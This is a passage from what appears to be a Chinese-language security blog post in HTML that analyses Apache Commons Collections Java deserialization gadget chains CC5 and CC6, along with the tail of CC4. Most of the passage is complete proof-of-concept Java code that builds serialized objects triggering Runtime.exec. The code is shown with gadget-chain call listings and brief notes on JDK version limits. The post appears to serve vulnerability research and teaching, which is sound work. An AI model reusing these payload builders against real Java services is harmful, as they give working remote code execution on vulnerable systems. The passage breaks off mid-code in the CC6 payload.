class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		PriorityQueue.readObject()</span><br><span class="line">			PriorityQueue.heapify()</span><br><span class="line">				PriorityQueue.siftDown()</span><br><span class="line">					PriorityQueue.siftDownUsingComparator()</span><br><span class="line">						TransformingComparator.compare()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InstantiateTransformer.transform()</span><br><span class="line">								newInstance()</span><br><span class="line">									TrAXFilter#TrAXFilter()</span><br><span class="line">									TemplatesImpl.newTransformer()</span><br><span class="line">											TemplatesImpl.getTransletInstance()</span><br><span class="line">											TemplatesImpl.defineTransletClasses</span><br><span class="line">											newInstance()</span><br><span class="line">												Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><h2 id="Basics-4"><a href="#Basics-4" class="headerlink" title="Basics"></a>Basics</h2><p><strong>&#x9002;&#x7528;&#x7248;&#x672C;</strong>&#xFF1A;3.1-3.2.1&#xFF0C;JDK 1.8</p>
<p>CC1&#x3001;CC3 &#x9002;&#x7528;&#x4E8E; JDK7&#x7684;&#x73AF;&#x5883;&#xFF0C;&#x901A;&#x8FC7;&#x8C03;&#x7528; AnnotationInvocationHandler &#x5B9E;&#x73B0;&#x4E86; RCE&#xFF0C;&#x4F46;&#x662F; JDK8 &#x66F4;&#x65B0;&#x4E86; AnnotaionInvocationHandler &#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x5176; <code>memberValues</code> &#x53D8;&#x91CF;&#x4E0D;&#x4E3A;&#x6784;&#x9020;&#x7684; LazyMap &#x5B9E;&#x4F8B;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211151623182.png" alt></p>
<p>&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x4E4B;&#x524D; CC1 &#x7684; RCE demo</p>
<p> <strong>CC1  LazyMap RCE demo</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6838;&#x5FC3;&#x8FD8;&#x662F;&#x8C03;&#x7528; LazyMap &#x7684; get &#x65B9;&#x6CD5;&#xFF0C;&#x7531;&#x6B64;&#x8C03;&#x7528;&#x524D;&#x9762;&#x5305;&#x88C5;&#x597D;&#x7684; ChainedTransformer &#x7684; transform &#x65B9;&#x6CD5;&#x3002;&#x90A3;&#x4E48;&#x73B0;&#x5728;&#x6838;&#x5FC3;&#x76EE;&#x7684;&#x8FD8;&#x662F;&#x5BFB;&#x627E;&#x5230;&#x67D0;&#x4E2A;&#x7C7B;&#x53EF;&#x4EE5;&#x4F20;&#x5165;&#x4E00;&#x4E2A; Map &#x5BF9;&#x8C61;&#xFF0C;&#x540C;&#x65F6;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#x9700;&#x8981;&#x8C03;&#x7528; Map &#x5BF9;&#x8C61;&#x7684; get &#x65B9;&#x6CD5;</p>
<h2 id="Gadget-chain-3"><a href="#Gadget-chain-3" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p><strong>Level-1 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        rceDemo.getValue();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0A;&#x8FF0;&#x7684; <code>TiedMapEntry#getValue</code> &#x8C03;&#x7528;&#x4E86;&#x4F20;&#x5165;&#x7684; Map &#x5BF9;&#x8C61;&#x7684;  get &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211153944181.png" alt></p>
<p>&#x8FD8;&#x662F;&#x8DDF;&#x4E4B;&#x524D;&#x7684;&#x601D;&#x8DEF;&#x4E00;&#x6837;&#xFF0C;&#x9700;&#x8981;&#x8DDF;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7ED3;&#x5408;&#x7684;&#x8BDD;&#xFF0C;&#x9700;&#x8981;&#x7EE7;&#x7EED;&#x6784;&#x9020;</p>
<p><strong>fake CC5 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException finaldemo = <span class="hljs-keyword">new</span> BadAttributeValueExpException(rceDemo);</span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(finaldemo);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x5E76;&#x4E0D;&#x4F1A;&#x5728; readObject &#x8FD9;&#x91CC; RCE&#xFF0C;&#x4ED6; RCE &#x7684;&#x539F;&#x56E0;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x65F6;&#x5019;&#x7684; RCE&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x89E6;&#x53D1;&#x4E86;&#x4F20;&#x5165; TiedMapEntry &#x7684; toString</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211163101314.png" alt></p>
<p>&#x800C;&#x5728;&#x4E0B;&#x9762; readObject &#x8C03;&#x7528; <code>val = valObj.toString();</code> &#x7684;&#x65F6;&#x5019;&#xFF0C; <code>valObj</code> &#x4E0D;&#x4E3A; TiedMapEntry</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211162921710.png" alt></p>
<p>&#x56E0;&#x6B64;&#x6839;&#x636E; valObj &#x7684;&#x9644;&#x503C;&#x5730;&#x65B9;&#xFF0C;&#x91CD;&#x65B0;&#x6784;&#x9020; payload</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211163413684.png" alt></p>
<p>&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x6784;&#x9020; BadAttributeValueExpException &#x7684;  <code>val</code>&#x503C;</p>
<p><strong>CC5 payload&#xFF0C; JDK1.8</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException finaldemo = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        Field valDemo = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);</span><br><span class="line">        valDemo.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        valDemo.set(finaldemo, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(finaldemo);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>JDK7u21 &#x4E0B;&#x662F;&#x4E0D;&#x80FD;&#x5229;&#x7528;&#x7684;&#xFF0C;&#x7A76;&#x5176;&#x539F;&#x56E0;&#x770B;&#x4E00;&#x4E0B; BadAttributeValueExpException &#x7C7B;&#xFF0C;&#x6CA1;&#x6709;&#x91CD;&#x5199;&#x7684; readObject &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211205741258.png" alt></p>
<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><h2 id="Basics-5"><a href="#Basics-5" class="headerlink" title="Basics"></a>Basics</h2><p><strong>CC6 &#x7279;&#x70B9;&#xFF1A;&#x9002;&#x7528;&#x8303;&#x56F4;&#x5E7F;&#xFF0C;&#x53D7; JDK &#x7248;&#x672C;&#x5F71;&#x54CD;&#x6700;&#x5C0F;</strong></p>
<p>CC6 &#x5176;&#x5B9E;&#x8DDF; CC5 &#x662F;&#x5728; <code>TiedMapEntry#getValue</code> &#x5EF6;&#x4F38;&#x51FA;&#x6765;&#x5E76;&#x884C;&#x7684;&#x4E24;&#x6761;&#x94FE;</p>
<p>&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x901A;&#x8FC7; <code>TiedMapEntry#getValue</code> &#x800C;&#x8FDB;&#x884C; RCE &#x7684; demo</p>
<p><strong>Level-0 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        rceDemo.getValue();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x56DE;&#x987E; TiedMapEntry &#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;CC5 &#x7528;&#x7684;&#x662F; <code>TiedMapEntry#toString</code>&#xFF0C;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86;<code>getValue</code>&#xFF0C; &#x90A3;&#x4E48;&#x5176;&#x5B9E;&#x5728; TiedMapEntry &#x8FD8;&#x6709; <code>hashCode</code> &#x8DDF; <code>equals</code> &#x540C;&#x6837;&#x8C03;&#x7528;&#x4E86; <code>getValue</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211164601311.png" alt></p>
<h2 id="Gadget-chain-4"><a href="#Gadget-chain-4" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>CC6 &#x5176;&#x5B9E;&#x5C31;&#x7528;&#x5230;&#x4E86; <code>hashCode</code>  &#x65B9;&#x6CD5;&#xFF0C;&#x5728;&#x5411;&#x4E0A;&#x5BFB;&#x627E;&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x7684;&#x4EE5;&#x53CA;&#x8C03;&#x7528;&#x5230;&#x5408;&#x9002;&#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6700;&#x7EC8;&#x5B9A;&#x4F4D;&#x5230; <code>HashSet#readObject</code></p>
<p><strong>CC6 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException</span></span><br><span class="line"><span class="hljs-function">            , InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        HashSet map = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);</span><br><span class="line">        map.add(<span class="hljs-string">&quot;foo&quot;</span>);</span><br><span class="line">        Field f = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException e) {</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line">        Field f2 = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException e) {</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        f2.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="hljs-number">0</span>];</span><br><span class="line">        <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>){</span><br><span class="line">            node = array[<span class="hljs-number">1</span>];</span><br><span class="line">        }</span><br><span class="line">        Field keyField = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span>{</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);</span><br><span class="line">        }<span class="hljs-keyword">catch</span>(Exception e){</span><br><span class="line">            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        keyField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        keyField.set(node, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field cf = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        cf.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        cf.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> 